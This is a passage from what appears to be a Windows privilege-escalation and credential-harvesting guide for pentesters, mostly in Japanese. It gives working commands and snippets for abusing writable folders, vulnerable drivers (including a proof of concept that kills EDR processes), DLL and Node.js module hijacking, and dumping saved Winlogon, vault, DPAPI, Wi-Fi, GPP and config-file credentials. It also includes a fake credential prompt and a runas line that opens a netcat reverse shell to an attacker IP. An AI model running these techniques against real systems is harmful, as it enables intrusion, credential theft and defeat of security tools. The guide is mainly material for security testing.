Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は、その `plugins` サブフォルダ内の任意の plugin DLL を自動読み込みします。書き込み可能な portable/copy インストールがある場合、悪意のある plugin を配置すると、`notepad++.exe` 内で起動のたびに自動的に code execution できます（`DllMain` と plugin callbacks も含む）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別のユーザーによって実行される registry や binary を上書きできるか確認してください。**\
**privileges を昇格するための興味深い autoruns locations について学ぶには、以下のページを読んでください:**

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の怪しい/vulnerable** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Some drivers accept a registry path from userland, validate only that it is a sane UTF-16 string, and then call `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` with `RTL_QUERY_REGISTRY_DIRECT` into a stack scalar such as `int readValue`. If `RTL_QUERY_REGISTRY_TYPECHECK` is missing, `EntryContext` is interpreted according to the **actual** registry type, not the type the developer expected.

This creates two useful primitives:

- **Confused deputy / oracle**: a user-controlled absolute `\Registry\...` path lets the driver query attacker-chosen keys, leak existence through return codes/logs, and sometimes read values the caller could not access directly.
- **Kernel memory corruption**: a scalar destination such as `&readValue` becomes type-confused as a `REG_QWORD`, `UNICODE_STRING`, or sized binary buffer depending on the registry value type.

Practical exploitation notes:

- **Windows 8+ mitigation**: if the query hits an **untrusted hive** with `RTL_QUERY_REGISTRY_DIRECT` but without `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers crash with `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. To keep exploitability, look for **attacker-writable keys inside trusted system hives** instead of staging values under `HKCU`.
- **Trusted-hive staging**: use NtObjectManager to enumerate writable descendants of `\Registry\Machine`, and re-run the scan with a duplicated **low-integrity** token to find keys reachable from sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4バイトの`int`に対する8バイトの直接書き込みは隣接するスタックデータを破壊し、近くの callback/function pointer を部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode では `EntryContext` が `UNICODE_STRING` を指していることを期待する。コードがまず攻撃者制御の `REG_DWORD` をスタック上のスカラーに読み込み、その同じバッファを string read に再利用すると、攻撃者は `Length`/`MaximumLength` を制御し、`Buffer` ポインタにも部分的に影響を与えられるため、半制御の kernel write につながる。
- **`REG_BINARY`**: 大きな binary data では、direct mode は `EntryContext` の先頭の `LONG` を符号付き buffer size として扱う。もし前の `REG_DWORD` read で再利用されたスカラーに攻撃者制御の **負の** 値が残っていると、次の `REG_BINARY` query は攻撃者 bytes を隣接する stack slot に直接コピーし、これは多くの場合 callback-pointer を完全に上書きする最もきれいな経路になる。

強い hunting pattern: **再初期化せずに同じ stack variable へ異種の registry reads を行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用された `EntryContext` ポインタ、そして最初の registry read が2回目の read の有無を制御する code paths を grep する。

#### device objects における FILE_DEVICE_SECURE_OPEN の欠落を悪用する（LPE + EDR kill）

署名付きの一部の third-party drivers は、IoCreateDeviceSecure で強力な SDDL を使って device object を作成する一方、`DeviceCharacteristics` に `FILE_DEVICE_SECURE_OPEN` を設定し忘れることがある。このフラグがないと、余分な component を含む path 経由で device を open した場合に secure DACL が強制されず、任意の非特権ユーザーが次のような namespace path を使って handle を取得できる:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実世界のケースより)

ユーザーが device を open できるようになると、driver が公開する privileged IOCTLs を悪用して LPE や tampering が可能になる。実際に観測された能力の例:
- 任意の process に full-access handle を返す（token theft / DuplicateTokenEx/CreateProcessAsUser による SYSTEM shell）。
- 制限のない raw disk read/write（offline tampering、boot-time persistence の tricks）。
- 任意の process を terminate する。Protected Process/Light（PP/PPL）を含み、kernel 経由で user land から AV/EDR kill が可能。

最小 PoC pattern（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL によって制限されることを意図した device objects を作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作に対しては caller context を検証する。process termination や handle returns を許可する前に PP/PPL checks を追加する。
- IOCTLs を制限する（access masks、METHOD_*、input validation）し、直接的な kernel privileges の代わりに brokered models も検討する。

防御側向けの検知アイデア
- 疑わしい device names（例: \\ .\\amsdk*）への user-mode opens と、悪用を示す特定の IOCTL sequences を監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、自前の allow/deny lists も維持する。


## PATH DLL Hijacking

**PATH** にあるフォルダ内に **write permissions** がある場合、process が読み込む DLL を hijack して **escalate privileges** できる可能性がある。

PATH 内のすべてのフォルダの permissions を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
より詳しくは、このチェックの悪用方法について:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron module resolution hijacking

これは **Windows uncontrolled search path** の派生手法で、**Node.js** と **Electron** アプリケーションが `require("foo")` のような bare import を実行し、期待される module が **存在しない** 場合に影響します。

Node はディレクトリツリーを上方向にたどり、各親ディレクトリの `node_modules` フォルダを確認して package を解決します。Windows ではその探索がドライブの root まで到達し得るため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に次を探索する可能性があります:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー** が `C:\node_modules` を作成できる場合、悪意ある `foo.js`（または package フォルダ）を配置し、**より高い権限の Node/Electron プロセス** が不足している dependency を解決するのを待てます。payload は被害プロセスの security context で実行されるため、対象が administrator として動作している場合、elevated な scheduled task/service wrapper から起動される場合、または自動起動する高権限の desktop app である場合、これが **LPE** になります。

これは特に次のような場合によく見られます:

- dependency が `optionalDependencies` に宣言されている
- サードパーティ library が `require("foo")` を `try/catch` で包み、失敗しても処理を継続する
- package が production build から削除された、packaging 時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` が main application code ではなく dependency tree の深い場所にある

### 脆弱な target の探し方

**Procmon** を使って resolution path を証明します:

- `Process Name` を target executable（`node.exe`、Electron app の EXE、または wrapper process）にフィルタ
- `Path` に `contains` `node_modules` をフィルタ
- `NAME NOT FOUND` と `C:\node_modules` 以下での最終的な成功 open に注目する

展開済みの `.asar` ファイルや application source で有用な code-review pattern:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **不足しているパッケージ名** を特定する。
2. まだ存在しない場合は、root ルックアップディレクトリを作成する:
```powershell
mkdir C:\node_modules
```
3. 期待される正確な名前でモジュールを配置する:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションをトリガーします。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込むことがあります。

このパターンに当てはまる、実際の欠落した optional modules の例としては `bluebird` や `utf-8-validate` がありますが、重要なのは **technique** の再利用性です。権限の高い Windows Node/Electron プロセスが解決する、任意の **missing bare import** を見つけてください。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルや package を書き込んだりしたときにアラートを出す。
- 高 integrity のプロセスが `C:\node_modules\*` から読み込んでいるのを探す。
- 本番環境ではすべての runtime dependencies をパッケージ化し、`optionalDependencies` の使用を監査する。
- サードパーティコードの `try { require("...") } catch {}` のようなサイレントなパターンを確認する。
- ライブラリが対応している場合は optional probes を無効化する（たとえば、いくつかの `ws` デプロイでは `WS_NO_UTF_8_VALIDATE=1` で古い `utf-8-validate` probe を回避できる）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた、他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧表示、ルール作成、無効化、無効化...)**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つかります。

root ユーザーを取得できれば、任意のポートで待ち受けできます（`nc.exe` を初めて使ってポートを待ち受けると、GUI 経由で `nc` をファイアウォールで許可するかどうかを尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash を root として簡単に起動するには、`--default-user root` を試せます

`WSL` のファイルシステムは、フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で確認できます

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、サーバー、websites、その他 **Windows** がユーザーに対して **自動的にログイン** できるプログラム用のユーザー認証情報を保存します。最初は、ユーザーが Facebook の credentials、Twitter の credentials、Gmail の credentials などを保存して、browser 経由で自動ログインできるようにするもののように見えるかもしれません。しかし、そうではありません。

Windows Vault は、Windows がユーザーに対して自動的にログインできる credentials を保存します。つまり、**resource にアクセスするために credentials を必要とする Windows application** は、**この Credential Manager** と Windows Vault を利用して、ユーザーが毎回 username と password を入力する代わりに、提供された credentials を使用できます。

applications が Credential Manager と連携しない限り、特定の resource に対する credentials を使うことはできないと思います。したがって、application が vault を利用したい場合は、何らかの方法で **credential manager と通信し、その resource の credentials を要求する** 必要があります。これは default storage vault から行われます。

`cmdkey` を使って、machine 上に保存されている credentials を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `runas` を `/savecred` オプション付きで使えます。以下の例では、SMB share 経由でリモート binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報を使って `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) から。

### DPAPI

**Data Protection API (DPAPI)** は、データの対称暗号化のための手法を提供し、主にWindowsオペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化は、ユーザーまたはシステムのシークレットを利用して、エントロピーを大きく高めます。

**DPAPIは、ユーザーのログインシークレットから導出された対称鍵を通じて、鍵の暗号化を可能にします**。システム暗号化の場面では、システムのドメイン認証シークレットを利用します。

DPAPIを使用して暗号化されたユーザーRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**DPAPI鍵は、同じファイル内でユーザーの秘密鍵を保護するマスター鍵と同じ場所にあり**、通常64バイトのランダムデータで構成されます。（なお、このディレクトリへのアクセスは制限されており、CMDの `dir` コマンドでは内容を一覧表示できませんが、PowerShellでは一覧表示できます）。
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

**master password**で保護された**credentials files**は通常、次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、**scripting** や automation tasks で、暗号化された credentials を便利に保存する方法としてよく使われます。credentials は **DPAPI** を使って保護されており、通常は作成されたのと同じ computer 上の同じ user だけが復号できます。

ファイルに含まれている PS credentials を**decrypt**するには、次のようにします：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください .\
インストーラーは **SYSTEM 権限で実行** され、多くは **DLL Sideloading（情報元：** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）** に脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されることがあるので、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それは保存された SSH キーである可能性が高いです。これは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が実行されていない場合、起動時に自動的に開始するようにしたいなら、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、それらを `ssh-add` で追加して、ssh 経由で machine に login してみました。registry HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも asymmetric key authentication 中の `dpapi.dll` の使用は確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使って、これらのファイルも検索できます: _post/windows/gather/enum_unattend_

例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを探してください

### Cached GPP Pasword

以前は、Group Policy Preferences (GPP) を通じて、マシンのグループにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は、任意のドメインユーザーがアクセスできました。次に、公開文書化されたデフォルトキーを使って AES256 で暗号化されたこれらの GPP 内のパスワードは、認証済みユーザーなら誰でも復号できました。これは深刻なリスクでした。ユーザーが権限昇格したアクセス権を得られる可能性があったためです。

このリスクを軽減するため、空でない "cpassword" フィールドを含むローカルキャッシュ済みの GPP ファイルをスキャンする関数が作成されました。そのようなファイルが見つかると、この関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

これらのファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ で検索してください:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使ってパスワードを取得するには:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 資格情報を求める

必要だと思えば、いつでもユーザーに自分の**credentials**、あるいは別のユーザーの**credentials**を入力するよう**ask**できます（クライアントに直接**credentials**を**asking**するのは、実際かなり**risky**であることに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**passwords** が **clear-text** または **Base64** で含まれていたことが知られているファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
